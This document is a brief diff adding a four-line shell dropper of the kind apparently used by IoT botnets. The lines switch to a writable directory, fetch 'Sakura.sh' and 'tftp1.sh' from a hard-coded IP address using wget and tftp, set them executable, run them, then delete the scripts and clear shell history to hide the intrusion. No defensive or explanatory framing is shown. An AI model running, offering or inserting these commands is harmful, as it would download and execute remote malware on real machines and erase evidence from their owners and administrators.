@@ -1,0 +1,4 @@
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd
+ /; wget http://178.62.64.163/Sakura.sh; chmod 777 *; sh Sak
+ura.sh; tftp -g 178.62.64.163 -r tftp1.sh; chmod 777 *; sh t
+ftp1.sh; rm -rf *.sh; history -c
